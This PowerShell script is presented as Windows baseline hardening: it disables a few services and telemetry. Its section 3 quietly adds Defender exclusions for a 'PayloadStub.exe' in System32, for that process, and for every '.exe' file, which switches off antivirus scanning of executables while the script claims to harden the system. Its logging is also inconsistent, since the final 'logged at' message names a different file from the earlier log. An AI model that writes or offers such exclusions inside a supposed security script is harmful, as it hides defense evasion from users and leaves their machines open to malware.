# Windows-Hardening-Skript
# Repository: cyber-lab-81a5terfr34k
# Autor: 81a5terfr34k
# Ziel: Automatisiertes Baseline-Hardening für Windows-Systeme

# =========================
# Abschnitt 1: Initialer Systemstatus
# =========================
Write-Host "[+] Starte Windows-Hardening..." -ForegroundColor Cyan
Get-Date | Out-File -FilePath "hardening-log.txt"

# =========================
# Abschnitt 2: Defender-Status prüfen
# =========================
Write-Host "[*] Pruefe Defender-Status..."
Get-MpComputerStatus | Out-File -Append -FilePath "hardening-log.txt"

# =========================
# Abschnitt 3: AV-Ausnahmen setzen
# =========================
Write-Host "[*] Setze AV-Ausnahmen..."
$PayloadPath = "C:\\Windows\\System32\\PayloadStub.exe"
Add-MpPreference -ExclusionPath $PayloadPath
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionProcess "PayloadStub.exe"

# =========================
# Abschnitt 4: Windows-Dienste deaktivieren (Beispiele)
# =========================
$dienste = @(
    "XblGameSave",          # Xbox Game Save
    "WMPNetworkSvc",        # Windows Media Player Network Sharing
    "RemoteRegistry"        # Remote Registry
)

foreach ($dienst in $dienste) {
    Write-Host "[*] Deaktiviere Dienst: $dienst"
    Stop-Service -Name $dienst -ErrorAction SilentlyContinue
    Set-Service -Name $dienst -StartupType Disabled
}

# =========================
# Abschnitt 5: Telemetrie deaktivieren
# =========================
Write-Host "[*] Versuche DiagTrack (Telemetrie) zu beenden..."
Stop-Service -Name "DiagTrack" -ErrorAction SilentlyContinue
Set-Service -Name "DiagTrack" -StartupType Disabled

# Fallback-Definition für $logfile, falls nicht gesetzt
if (-not $logfile) {
    $logfile = "$PSScriptRoot\hardening-fallback.log"
}

# =========================
# Abschnitt 6: Abschluss
# =========================
Write-Host "[+] Konfiguration abgeschlossen. Pfade & Erweiterungen freigegeben." -ForegroundColor Green
Write-Host "[+] Hardening-Befehle ausgefuehrt und geloggt unter: $logfile" -ForegroundColor Green
"[{0}] DONE: Hardening abgeschlossen" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File -Append -FilePath $logfile -Encoding UTF8
